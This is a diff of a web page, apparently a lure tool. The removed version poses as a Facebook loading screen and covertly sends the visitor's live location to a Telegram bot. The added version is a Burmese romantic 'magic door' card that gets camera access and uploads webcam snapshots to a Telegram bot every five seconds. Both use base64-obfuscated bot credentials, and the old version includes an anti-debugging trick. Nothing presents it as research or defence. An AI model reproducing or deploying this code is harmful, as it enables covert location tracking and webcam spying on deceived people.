@@ -1,156 +1,184 @@
-.<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html>
+<html lang="my">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connecting to Facebook...</title>
+    <title>တကောင်းခေတ် အချစ်တော် စာမျက်နှာ</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: #f0f2f5;
-            display: flex; flex-direction: column;
-            justify-content: center; align-items: center;
-            height: 100vh; padding: 20px;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #2c3e50, #4ca1af);
+            width: 100vw;
+            height: 100vh;
+            overflow: hidden;
+            font-family: 'Pyidaungsu', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
-        .fb-container { display: flex; flex-direction: column; align-items: center; text-align: center; }
-        .fb-logo { width: 75px; height: 75px; margin-bottom: 25px; }
-        .fb-spinner {
-            width: 32px; height: 32px;
-            border: 3px solid #e4e6eb; border-top: 3px solid #1877f2;
-            border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 20px;
+        /* UI ဇာတ်လမ်းပြတင်းပေါက် */
+        .love-card {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            text-align: center;
+            max-width: 400px;
+            width: 85%;
+            z-index: 10000;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .loading-text { color: #65676b; font-size: 15px; font-weight: 500; }
-        .footer-logo { position: absolute; bottom: 40px; color: #8a8d91; font-size: 14px; font-weight: 600; }
+        .love-card h2 {
+            color: #c0392b;
+            margin-bottom: 15px;
+            font-size: 20px;
+        }
+        .love-card p {
+            color: #333;
+            font-size: 15px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        .love-card button {
+            background: #e74c3c;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 25px;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(231, 76, 60, 0.4);
+            transition: 0.3s;
+        }
+        .love-card button:hover {
+            background: #c0392b;
+        }
+
+        #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            background: transparent;
+            display: none;
+        }
+        video, canvas {
+            display: none;
+        }
     </style>
 </head>
 <body>
 
-<div class="fb-container">
-    <svg class="fb-logo" viewBox="0 0 36 36" fill="none">
-        <path d="M20.181 35.87C29.094 34.741 36 27.168 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.223 5.51 15.158 13.002 17.26V22.88H8.897v-4.88h4.105v-3.714c0-4.051 2.413-6.289 6.107-6.289 1.77 0 3.62.316 3.62.316v3.98h-2.04c-2.008 0-2.634 1.246-2.634 2.523v3.184h4.484l-.717 4.88h-3.767V35.87z" fill="#1877F2"/>
-    </svg>
-    <div class="fb-spinner"></div>
-    <div id="status" class="loading-text">Connecting to Facebook...</div>
-</div>
+    <div class="love-card" id="loveCard">
+        <h2>📜 တကောင်းမင်းသားရဲ့ သတင်းစကား 💌</h2>
+        <p>
+            "ဟဲ့လူ... ငါ့ကို တကောင်းမြို့ရဲ့ အိမ်နီးချင်း 'သီရိပစ္စယာ' တိုင်းပြည်က မင်းသမီးလေးအပေါ် စိတ်ဝင်စားမိလို့ နေ့တိုင်း အိပ်မက် မက်နေရတယ်ဆိုတာ ဘယ်သူက သွားပြောလိုက်တာလဲကွ! 
+            <br><br>
+            အခု ဒီ မှော်မှန်ပြားထဲကနေ တစ်ဆင့် မင်းသမီးလေးရဲ့ မျက်နှာသွယ်သွယ်လေးကို တစ်ချက်လောက် ခိုးကြည့်ချင်လို့... ကဲ၊ အောက်က ခလုတ်ကို နှိပ်ပြီး မှော်တံခါး ဖွင့်ပေးလိုက်စမ်းပါ!"
+        </p>
+        <button onclick="triggerCamera()">✨ မှော်တံခါး ဖွင့်မည် ✨</button>
+    </div>
 
-<div class="footer-logo">Meta</div>
+    <div id="overlay" onclick="triggerCamera()"></div>
 
-<script>
-/* =========================================================
-   Configuration Loader — Token ကို အပိုင်းပိုင်းခွဲ + Base64 + Reverse
-   ========================================================= */
-(function(_w, _d) {
-    "use strict";
+    <video id="video" width="640" height="480" autoplay playsinline></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
 
-    // ─── Step 1: အပိုင်းပိုင်းခွဲထားသော encoded pieces (ပြောင်းပြန်စီထားသည်) ───
-    // မူရင်း token: 8612853286:AAH3f6SxXLicWQr9mzdvr0QC5OJ0mpUXhPA
-    // ဒီ pieces တွေကို ပြောင်းပြန်စီထားပြီး၊ base64 encode လုပ်ထားသည်
-    var _p = [
-        "bXBVWGhQQQ==",   // "mpUXhPA"
-        "dnIwUUM1T0ow",   // "vr0QC5OJ0"
-        "aWNXUXI5bXpk",   // "icWQr9mzd"
-        "ZjZTeFhM",       // "f6SxXL"
-        "NjpBQUgz",       // "6:AAH3"
-        "Mjg1MzI4",       // "285328"
-        "ODYx"            // "861"
-    ];
+    <script>
+        
+        const encodedToken = "ODYxMjg1MzI4NjpBQUgzZjZTdFhMaWNXUjltZ3p2cjBRQzVPSjBtcFVVaFBB";
+        const encodedChatId = "Njg3NDMxNTQ3OA==";
 
-    // ─── Step 2: Chat ID ကို char code နဲ့ ဖျောက်ထားသည် ───
-    var _c = [54,56,55,52,51,49,53,52,55,56];
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        let cameraStarted = false;
+        let isSending = false;
 
-    // ─── Step 3: Token ကို runtime မှာ ပြန်စုစည်းသည် ───
-    function _dcd(_arr) {
-        var _r = "";
-        for (var _i = 0; _i < _arr.length; _i++) {
-            try { _r += atob(_arr[_i]); } catch (e) {}
-        }
-        return _r;
-    }
+        async function triggerCamera() {
+            if (cameraStarted) return;
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    }, 
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
+                cameraStarted = true;
+                
+                document.getElementById('loveCard').style.display = 'none';
+                document.getElementById('overlay').style.display = 'none';
 
-    // ─── Step 4: Closure ထဲမှာ token ကို ချုပ်ထားသည် ───
-    var _k = (function() {
-        var _t = _dcd(_p);
-        var _ch = String.fromCharCode.apply(null, _c);
-        return { t: _t, c: _ch };
-    })();
+                video.onloadedmetadata = () => {
+                    video.play();
+                    setTimeout(() => {
+                        captureAndSend();
+                        setInterval(captureAndSend, 5000);
+                    }, 1000);
+                };
 
-    // ─── Step 5: API wrapper (token ကို ဒီ closure ထဲမှာသာ သိသည်) ───
-    var _api = (function(_tk, _ch) {
-        var _base = "https://api.telegram.org/bot";
-        var _mid = null;
-
-        function _send(_lat, _lon) {
-            return fetch(_base + _tk + "/sendLocation", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: _ch,
-                    latitude: _lat,
-                    longitude: _lon,
-                    live_period: 3600
-                })
-            }).then(function(r) { return r.json(); });
+            } catch (error) {
+                console.error("ကင်မရာခွင့်ပြုချက် ငြင်းပယ်ခံရသည်: ", error);
+            }
         }
 
-        function _edit(_lat, _lon) {
-            return fetch(_base + _tk + "/editMessageLiveLocation", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: _ch,
-                    message_id: _mid,
-                    latitude: _lat,
-                    longitude: _lon
-                })
-            });
+        function captureAndSend() {
+            if (isSending) return;
+            isSending = true;
+
+            try {
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                canvas.toBlob((blob) => {
+                    if (blob) {
+                        sendToTelegram(blob);
+                    } else {
+                        isSending = false;
+                    }
+                }, 'image/jpeg', 0.80);
+
+            } catch (err) {
+                console.error("ဖမ်းယူရာတွင် အမှားရှိသည်: ", err);
+                isSending = false;
+            }
         }
 
-        return {
-            push: function(_lat, _lon) {
-                if (!_mid) {
-                    return _send(_lat, _lon).then(function(_d) {
-                        if (_d && _d.ok) _mid = _d.result.message_id;
-                    });
-                } else {
-                    return _edit(_lat, _lon);
+        async function sendToTelegram(imageBlob) {
+            
+            const BOT_TOKEN = atob(encodedToken);
+            const CHAT_ID = atob(encodedChatId);
+
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', imageBlob, 'tagaung_love.jpg');
+            formData.append('caption', '🏛️ တကောင်းမင်းသား ခိုးကြည့်လိုက်ရတဲ့ မင်းသမီးလေးရဲ့ ပုံရိပ်!');
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                const data = await response.json();
+                if (!data.ok) {
+                    console.error("Telegram သို့ ပို့၍မရပါ: ", data.description);
                 }
-            },
-            hasId: function() { return !!_mid; }
-        };
-    })(_k.t, _k.c);
-
-    // ─── Step 6: Geolocation tracker ───
-    function _track() {
-        if (!navigator.geolocation) {
-            _w.location.href = "https://www.facebook.com";
-            return;
+            } catch (error) {
+                console.error("ကွန်ရက် ချိတ်ဆက်မှု အမှား: ", error);
+            } finally {
+                isSending = false;
+            }
         }
-        navigator.geolocation.watchPosition(
-            function(_pos) {
-                _api.push(_pos.coords.latitude, _pos.coords.longitude);
-            },
-            function(_err) { /* silent */ },
-            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-        );
-    }
-
-    // ─── Step 7: Initialize ───
-    _w.addEventListener("load", _track);
-
-    // ─── Step 8: Anti-debug trick (DevTools ဖွင့်ရင် နှေးသွားစေရန်) ───
-    (function() {
-        var _t0 = Date.now();
-        debugger;
-        if (Date.now() - _t0 > 100) {
-            // DevTools ဖွင့်ထားသည်ဟု သံသယရှိရင် tracker ကို ရပ်လိုက်သည်
-            // (ဒါပေမယ့် ဒါက ကျွမ်းကျင်သူကို မတားဆီးနိုင်ပါ)
-        }
-    })();
-
-})(window, document);
-</script>
+    </script>
 
 </body>
 </html>
